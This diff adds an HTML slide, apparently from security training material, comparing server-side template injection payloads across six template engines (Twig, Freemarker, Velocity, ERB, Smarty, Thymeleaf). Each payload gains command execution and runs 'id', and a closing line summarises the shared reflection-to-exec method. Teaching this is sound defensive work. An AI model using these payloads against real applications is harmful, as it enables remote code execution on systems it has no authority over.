@@ -1,0 +1,44 @@
+<section>
+  <h2 class="section-title">Same idea, different syntax</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">Twig (PHP)</div>
+        <pre><code class="language-twig">&#123;&#123; _self.env.registerUndefinedFilterCallback("system") &#125;&#125;
+&#123;&#123; _self.env.getFilter("id") &#125;&#125;</code></pre>
+      </div>
+      <div class="card card-red" style="margin-top: 12px;">
+        <div class="card-header">Freemarker (Java)</div>
+        <pre><code class="language-text">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;
+${ ex("id") }</code></pre>
+      </div>
+      <div class="card card-red" style="margin-top: 12px;">
+        <div class="card-header">Velocity (Java)</div>
+        <pre><code class="language-text">#set($e="exp")
+$e.getClass().forName("java.lang.Runtime")
+  .getMethod("exec",[""].getClass())
+  .invoke($e.getClass().forName("java.lang.Runtime")
+    .getMethod("getRuntime").invoke(null), "id")</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">ERB (Ruby)</div>
+        <pre><code class="language-erb">&lt;%= `id` %&gt;
+&lt;%= system("id") %&gt;</code></pre>
+      </div>
+      <div class="card card-red" style="margin-top: 12px;">
+        <div class="card-header">Smarty (PHP)</div>
+        <pre><code class="language-smarty">&#123;system('id')&#125;
+&#123;php&#125;system('id');&#123;/php&#125;</code></pre>
+      </div>
+      <div class="card card-red" style="margin-top: 12px;">
+        <div class="card-header">Thymeleaf (Java)</div>
+        <pre><code class="language-text">__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x</code></pre>
+      </div>
+      <div class="textbox" style="margin-top: 12px;">
+        <p><span class="inline-tag tag-purple">Same primitive everywhere</span> Reach a class with reflection, get a process API, exec.</p>
+      </div>
+    </div>
+  </div>
+</section>
